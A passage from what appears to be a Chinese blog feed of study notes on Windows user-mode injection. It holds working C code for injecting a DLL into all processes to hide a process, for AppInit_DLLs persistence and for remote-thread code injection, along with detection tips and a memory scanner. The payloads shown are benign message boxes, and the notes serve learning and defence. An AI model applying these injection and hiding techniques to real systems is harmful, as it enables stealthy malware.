INVALID_HANDLE_VALUE;</span><br><span class="line">	PROCESSENTRY32	pe;</span><br><span class="line"></span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	Process32First(hSnapShot, &amp;pe);</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		dwPID = pe.th32ProcessID;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwPID &lt; <span class="number">100</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nMode == INJECTION_MODE)</span><br><span class="line">			InjectDll(dwPID, szDllPath);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			EjectDll(dwPID, szDllPath);</span><br><span class="line">	&#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe));</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnapShot);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>	nMode = INJECTION_MODE;</span><br><span class="line">	HMODULE	hLib = <span class="literal">NULL</span>;</span><br><span class="line">	SetPid	setPid = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n Usage  : HideProc.exe &lt;-i|-e&gt;  &lt;process id&gt; &lt;dll path&gt;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//提权</span></span><br><span class="line">	SetPrivilege(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">	hLib = LoadLibrary(argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	setPid = (SetPid)GetProcAddress(hLib, <span class="string">&quot;SetPid&quot;</span>);</span><br><span class="line">	setPid((DWORD)atoi(argv[<span class="number">2</span>]));</span><br><span class="line">	FreeLibrary(hLib);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!_stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-e&quot;</span>))</span><br><span class="line">		nMode = EJECTION_MODE;</span><br><span class="line"></span><br><span class="line">	InjectAllProcess(nMode, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>MessageBoxA靶子程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;testtext&quot;</span>, <span class="string">&quot;testtitle&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>R3Hook</category>
      </categories>
      <tags>
        <tag>R3Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>AppInit_DLLS及其他</title>
    <url>/posts/5329b9a8/</url>
    <content><![CDATA[<p> AppInit_DLLs(本地复现未成功)</p>
<p><a href="https://learn.microsoft.com/zh-cn/windows/win32/win7appqual/appinit-dlls-in-windows-7-and-windows-server-2008-r2?redirectedfrom=MSDN">https://learn.microsoft.com/zh-cn/windows/win32/win7appqual/appinit-dlls-in-windows-7-and-windows-server-2008-r2?redirectedfrom=MSDN</a></p>
<p><a href="https://bbs.pediy.com/thread-266985.htm#msg_header_h1_3">https://bbs.pediy.com/thread-266985.htm#msg_header_h1_3</a></p>
<p><a href="https://blog.csdn.net/qq_36374896/article/details/107005590">https://blog.csdn.net/qq_36374896/article/details/107005590</a></p>
<p><a href="https://blog.csdn.net/u013565525/article/details/28416279">https://blog.csdn.net/u013565525/article/details/28416279</a></p>
<p><strong>使用注册表 AppInit_DLLs写入要注入的DLL路径字符串然后把LoadAppInit_DLLs值设置为1，重启后，DLL会注入所有运行进程（user32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若有值则调用loadLibrary加载用户dll，即但凡是导入了user32.dll的程序都会加载该模块）</strong></p>
<p><strong>在自己的win7虚拟机试了几次 使用该方法总是会蓝屏。。。（win7sp1版）</strong></p>
<p>64位系统：<br>AppInit_Dlls(64位程序读取)<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows [AppInit_DLLs]</p>
<p>AppInit_Dlls(32位程序读取)<br>HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows [AppInit_DLLs]</p>
<p>32位系统：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows [AppInit_DLLs]</p>
<p><img src="/posts/5329b9a8/1.png" alt="img"></p>
<h5 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h5><ul>
<li>监测加载User32.dll的进程的dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。</li>
<li>监视AppInit_DLLs注册表值。</li>
<li>监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx</li>
</ul>
<h4 id="扫描进程内存——用户层dll注入简单判断"><a href="#扫描进程内存——用户层dll注入简单判断" class="headerlink" title="扫描进程内存——用户层dll注入简单判断"></a>扫描进程内存——用户层dll注入简单判断</h4><p>可以关注下是否有执行权限</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">ScanProcessMemory</span><span class="params">(HANDLE hProc)</span></span><br><span class="line">&#123;</span><br><span class="line">	SIZE_T stSize = <span class="number">0</span>;</span><br><span class="line">	PBYTE pAddress = (PBYTE)<span class="number">0</span>;</span><br><span class="line">	SYSTEM_INFO sysinfo;</span><br><span class="line">	MEMORY_BASIC_INFORMATION mbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取页的大小</span></span><br><span class="line">	ZeroMemory(&amp;sysinfo, <span class="keyword">sizeof</span>(SYSTEM_INFO));</span><br><span class="line">	GetSystemInfo(&amp;sysinfo);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 得到的镜像基地址</span></span><br><span class="line">	pAddress = (PBYTE)sysinfo.lpMinimumApplicationAddress;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;------------------------------------------------------------------------ \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;开始地址 \t 结束地址 \t\t 大小 \t 状态 \t 内存类型 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;------------------------------------------------------------------------ \n&quot;</span>);</span><br><span class="line">	<span class="comment">// 判断只要当前地址小于最大地址就循环</span></span><br><span class="line">	<span class="keyword">while</span> (pAddress &lt; (PBYTE)sysinfo.lpMaximumApplicationAddress)</span><br><span class="line">	&#123;</span><br><span class="line">		ZeroMemory(&amp;mbi, <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION));</span><br><span class="line">		stSize = VirtualQueryEx(hProc, pAddress, &amp;mbi, <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (stSize == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			pAddress += sysinfo.dwPageSize;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%08X \t 0x%08X \t %8d K \t &quot;</span>, mbi.BaseAddress,</span><br><span class="line">		((DWORD)mbi.BaseAddress + (DWORD)mbi.RegionSize),mbi.RegionSize&gt;&gt;<span class="number">10</span>);</span><br><span class="line">		<span class="keyword">switch</span> (mbi.State)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> MEM_FREE: <span class="built_in">printf</span>(<span class="string">&quot;空闲 \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_RESERVE: <span class="built_in">printf</span>(<span class="string">&quot;保留 \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_COMMIT: <span class="built_in">printf</span>(<span class="string">&quot;提交 \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;未知 \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (mbi.Type)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> MEM_PRIVATE:   <span class="built_in">printf</span>(<span class="string">&quot;私有  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_MAPPED:    <span class="built_in">printf</span>(<span class="string">&quot;映射  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> MEM_IMAGE:     <span class="built_in">printf</span>(<span class="string">&quot;镜像  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;未知  \t&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mbi.Protect == <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;E--&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE_READ)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ER-&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE_READWRITE)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ERW&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_READONLY)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;-R-&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_READWRITE)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;-RW&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_WRITECOPY)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;WCOPY&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (mbi.Protect &amp; PAGE_EXECUTE_WRITECOPY)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;EWCOPY&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 每次循环累加内存块的位置</span></span><br><span class="line">		pAddress = (PBYTE)mbi.BaseAddress + mbi.RegionSize;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</span><br><span class="line">	ScanProcessMemory(hProc);</span><br><span class="line">	CloseHandle(hProc);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/5329b9a8/2.png" alt="img"></p>
<h4 id="提权函数"><a href="#提权函数" class="headerlink" title="提权函数"></a>提权函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查找函数地址"><a href="#查找函数地址" class="headerlink" title="查找函数地址"></a>查找函数地址</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Messagebox</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HINSTANCE  libaddr = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;动态库基地址: 0x%x\n&quot;</span>, libaddr);</span><br><span class="line">    GetProcAddress(libaddr, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HINSTANCE proc = (MYPROC)GetProcAddress(libaddr, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;函数地址：0x%x\n&quot;</span>, proc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">	_In_ LPCSTR lpProcName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">/*HINSTANCE  libaddr = LoadLibraryA(&quot;user32.dll&quot;);</span></span><br><span class="line"><span class="comment">	printf(&quot;动态库基地址: 0x%x\n&quot;, libaddr);</span></span><br><span class="line"><span class="comment">	GetProcAddress(libaddr, &quot;MessageBoxA&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	HINSTANCE proc = (MYPROC)GetProcAddress(libaddr, &quot;MessageBoxA&quot;);</span></span><br><span class="line"><span class="comment">	printf(&quot;函数地址：0x%x\n&quot;, proc);*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// mamor</span></span><br><span class="line">	<span class="comment">//6D 61 6D 6F     72 00 00 00 </span></span><br><span class="line">	<span class="comment">//user32.ll动态库基地址: 0x75770000</span></span><br><span class="line">	<span class="comment">//MessageBoxA函数地址：0x757f1300</span></span><br><span class="line">	<span class="comment">//char* str = &quot;FLAG&quot;;</span></span><br><span class="line"></span><br><span class="line">	LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	_asm &#123;</span><br><span class="line">		sub esp,<span class="number">0x60</span>	<span class="comment">//抬高栈</span></span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx</span><br><span class="line">		push <span class="number">0x20202072</span></span><br><span class="line">		push <span class="number">0x6F6D616D</span>	<span class="comment">//字符串mamor</span></span><br><span class="line"></span><br><span class="line">		mov eax, esp</span><br><span class="line">		push ebx  <span class="comment">//0表示字符串结束</span></span><br><span class="line"></span><br><span class="line">		push <span class="number">0x20202072</span></span><br><span class="line">		push <span class="number">0x6F6D616D</span></span><br><span class="line"></span><br><span class="line">		mov ecx, esp <span class="comment">//获取第二个字符串的地址</span></span><br><span class="line">		<span class="comment">//MessageBoxA(0,&quot;&quot;,&quot;&quot;,0)</span></span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax, <span class="number">0x757f1300</span> <span class="comment">//MessageBoxA地址</span></span><br><span class="line">		call eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以使用od x32dbg等获取机器码 然后在使用内联汇编去调用即可</p>
<h4 id="正则表达式-shellcode转换"><a href="#正则表达式-shellcode转换" class="headerlink" title="正则表达式 shellcode转换"></a>正则表达式 shellcode转换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">([0-9a-fA-F]&#123;2&#125;)`  替换为 `0x\1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/5329b9a8/3.png" alt="img"></p>
]]></content>
      <categories>
        <category>用户态注入</category>
      </categories>
      <tags>
        <tag>用户态注入</tag>
      </tags>
  </entry>
  <entry>
    <title>代码注入</title>
    <url>/posts/843cce96/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">	FARPROC func[<span class="number">2</span>];  <span class="comment">//loadlibraryA GetProcAddress 地址</span></span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">4</span>][<span class="number">128</span>];  <span class="comment">//二级指针</span></span><br><span class="line"></span><br><span class="line">&#125; _DATA ,*THREAD_PARAM ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义 loadlibraryA函数指针</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">WINBASEAPI</span></span><br><span class="line"><span class="comment">_Ret_maybenull_</span></span><br><span class="line"><span class="comment">HMODULE</span></span><br><span class="line"><span class="comment">WINAPI</span></span><br><span class="line"><span class="comment">LoadLibraryA(</span></span><br><span class="line"><span class="comment">	_In_ LPCSTR lpLibFileName</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span><span class="params">(WINAPI* loadLibraryA)</span><span class="params">(LPCSTR lpLibFileName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义 GetProcAddress指针</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">WINBASEAPI</span></span><br><span class="line"><span class="comment">FARPROC</span></span><br><span class="line"><span class="comment">WINAPI</span></span><br><span class="line"><span class="comment">GetProcAddress(</span></span><br><span class="line"><span class="comment">	_In_ HMODULE hModule,</span></span><br><span class="line"><span class="comment">	_In_ LPCSTR lpProcName</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span><span class="params">(WINAPI* getProcAddress)</span><span class="params">(HMODULE hModule, LPCSTR lpProcName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MessageBoxA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">WINUSERAPI</span></span><br><span class="line"><span class="comment">int</span></span><br><span class="line"><span class="comment">WINAPI</span></span><br><span class="line"><span class="comment">MessageBoxA(</span></span><br><span class="line"><span class="comment">	_In_opt_ HWND hWnd,</span></span><br><span class="line"><span class="comment">	_In_opt_ LPCSTR lpText,</span></span><br><span class="line"><span class="comment">	_In_opt_ LPCSTR lpCaption,</span></span><br><span class="line"><span class="comment">	_In_ UINT uType);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* messageBoxA)</span><span class="params">( </span></span><br><span class="line"><span class="params">	HWND hWnd,</span></span><br><span class="line"><span class="params">	LPCSTR lpText,</span></span><br><span class="line"><span class="params">	LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">	UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">shellCode</span><span class="params">(LPVOID lparam)</span> &#123;</span><br><span class="line">	THREAD_PARAM param = (THREAD_PARAM)lparam;   <span class="comment">//定义成指针类型</span></span><br><span class="line">	HMODULE hmod = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//加载user32.dll </span></span><br><span class="line">	<span class="comment">// param-&gt;func[0]   loadlibraryA</span></span><br><span class="line">	<span class="comment">//param-&gt;buffer[0]  user32.dll</span></span><br><span class="line">	hmod = ((loadLibraryA)param-&gt;func[<span class="number">0</span>])(param-&gt;buffer[<span class="number">0</span>]); 	<span class="comment">// loadlibraryA()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取messageBoxA</span></span><br><span class="line">	<span class="comment">//param-&gt;func[1]  GetProcAddress</span></span><br><span class="line">	<span class="comment">//param.buffer[1] &quot;MessageBoxA&quot;</span></span><br><span class="line">	<span class="comment">//param.buffer[2] &quot;title&quot;</span></span><br><span class="line">	<span class="comment">//param.buffer[3] &quot;text&quot;</span></span><br><span class="line">	FARPROC messageboxfun = (FARPROC)((getProcAddress)param-&gt;func[<span class="number">1</span>])(hmod, param-&gt;buffer[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">//MessageBoxA弹窗</span></span><br><span class="line">	((messageBoxA)messageboxfun)(<span class="literal">NULL</span>, param-&gt;buffer[<span class="number">2</span>], param-&gt;buffer[<span class="number">3</span>], <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">injectCode</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">	_DATA param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	LPVOID remoteBuf[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HMODULE hmod = GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	param.func[<span class="number">0</span>] = GetProcAddress(hmod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	param.func[<span class="number">1</span>] = GetProcAddress(hmod, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">0</span>], <span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">1</span>], <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">2</span>], <span class="string">&quot;title&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(param.buffer[<span class="number">3</span>], <span class="string">&quot;text&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid );</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//分配Param结构体内存</span></span><br><span class="line">	<span class="type">int</span> size = <span class="keyword">sizeof</span>(_DATA);</span><br><span class="line">	remoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//把数据写入目标内存</span></span><br><span class="line">	WriteProcessMemory(hProcess, remoteBuf[<span class="number">0</span>], &amp;param, size, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将代码写入到目标内存</span></span><br><span class="line">	size = (DWORD)injectCode - (DWORD)shellCode; <span class="comment">//得到shellcode代码大小</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">	remoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(hProcess, remoteBuf[<span class="number">1</span>], shellCode, size, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	HANDLE thread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, remoteBuf[<span class="number">1</span>], remoteBuf[<span class="number">0</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == thread) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	WaitForSingleObject(thread,INFINITE);</span><br><span class="line">	CloseHandle(thread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*if (argc != 2)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		printf(&quot;请输入pid&quot;);</span></span><br><span class="line"><span class="comment">		return;</span></span><br><span 